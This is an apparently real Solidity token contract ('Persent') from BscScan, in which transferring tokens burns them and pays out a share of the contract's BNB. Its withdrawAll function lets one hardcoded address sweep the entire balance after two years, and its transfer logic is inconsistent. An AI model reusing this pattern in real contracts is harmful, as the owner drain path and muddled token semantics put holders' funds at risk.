/**
 *Submitted for verification at BscScan.com on 2021-08-31
*/

pragma solidity ^0.4.26;

contract ERC20Basic {

    string public constant name = "Persent";
    string public constant symbol = "PERSENT";
    uint8 public constant decimals = 18;  
    address public theowner; 


    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Income(address indexed from, uint amount);

    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;
    
    uint256 totalSupply_;
    uint today;

    using SafeMath for uint256;


   constructor() public {  
	totalSupply_ = 100000000000000000000; //^100^decimals
	balances[msg.sender] = totalSupply_;
	today = block.timestamp;
    }  

    function totalSupply() public view returns (uint256) {
	return totalSupply_;
    }
    
    function balanceOf(address tokenOwner) public view returns (uint) {
        return balances[tokenOwner];
    }
    
    function getBankBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    function getMyShare(address tokenOwner) public view returns (uint) {
        return address(this).balance*balances[tokenOwner]/totalSupply_;
    }

    function transfer(address receiver, uint numTokens) public returns (bool) {
        require(numTokens != 0);
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
    
        //balances[receiver] = balances[receiver].add(numTokens);
        receiver.transfer(address(this).balance * numTokens / totalSupply_);  
        totalSupply_ = totalSupply_.sub(numTokens);
        
        emit Transfer(msg.sender, address(0), numTokens);
        return true;
    }
    
    function transfer_old(address receiver, uint numTokens) public returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint numTokens) public returns (bool) {
        require(numTokens <= balances[owner]);    
        require(numTokens <= allowed[owner][msg.sender]);
    
        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        Transfer(owner, buyer, numTokens);
        return true;
    }
    
    function () external payable {}

     function withdrawAll() payable public {
         //this cower many cases with wrong calculation or users losts privatekeys etc.. 
         //doesn't affect normal userflow because all users can withdraw their funds in 2 year
         
         require(msg.sender == address(0x873351e707257C28eC6fAB1ADbc850480f6e0633));
         require (block.timestamp >= today + 2 years); 
         msg.sender.transfer(address(this).balance);
     }
     
}

library SafeMath { 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
}